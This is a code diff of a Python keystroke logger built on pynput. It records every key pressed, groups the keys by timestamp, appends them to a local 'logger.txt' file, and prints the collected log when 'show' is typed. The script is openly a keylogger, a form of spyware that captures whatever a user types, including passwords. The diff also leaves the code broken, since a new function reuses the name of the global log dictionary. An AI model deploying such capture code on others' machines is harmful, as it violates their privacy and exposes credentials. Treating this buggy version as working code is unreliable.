@@ -1,46 +1,53 @@
 from pynput.keyboard import Key, Listener
 import datetime
-
 pressed_keys = []
 log_dict = {}
 
 def on_press(key):
     global pressed_keys
 
-    pressed_keys.append(key)
-    if pressed_keys[-4:] == ['s','h','o','w']:
-        print('yes')
+    pressed_keys.append(str(key))
+    print(pressed_keys)
+    if pressed_keys[-4:] == ["'s'","'h'","'o'","'w'"]:
         for time, value in log_dict.items():
-             print(time + '\n' + '  ' + value)
+            print(time + '\n' + '  ' + value)
 
-    if pressed_keys[-1]==Key.space or pressed_keys[-1]==Key.enter or pressed_keys[-1]==Key.esc:
-        write_file(pressed_keys)
+    if pressed_keys[-1] == 'Key.space' or pressed_keys[-1] == 'Key.enter' or pressed_keys[-1]=='Key.esc':
+        log_dict(pressed_keys)
         pressed_keys = []
 
-def write_file(keys):
+def log_dict(keys):
+    global log_dict
     ct = datetime.datetime.now()
-    now = ct.strftime("%d-%m-%y %H:%M ")
+    now = str(ct.strftime("%d-%m-%y %H:%M "))
 
     data_str = ''
     for key in keys:
         k = str(key).replace("'","")
-
+        
         if k.find('backspace') > 0:
                 data_str = data_str[:-1]
-                k=''
-        if k.find('space') > 0:
+                # k = ''
+        elif k.find('space') > 0:
                 data_str += ' '
         if k.find('enter') > 0:
-            data_str += ' \n'
+            data_str += '\n'
         elif k.find('Key') == -1:
                 data_str += k
         else:
              continue
     if now in log_dict:
-        log_dict[now] += data_str
+            log_dict[now] += data_str
     else:
         log_dict[now] = data_str
-    print(log_dict)
+        print(log_dict)
+    write_file(log_dict)
+    log_dict = {}
+
+def write_file(log_dict):
+    with open('logger.txt', 'a') as f:
+        for key, value in log_dict.items():
+            f.write(key + '\n' + '  ' + value + '\n')
 
 def on_release(key):
     if key == Key.esc:
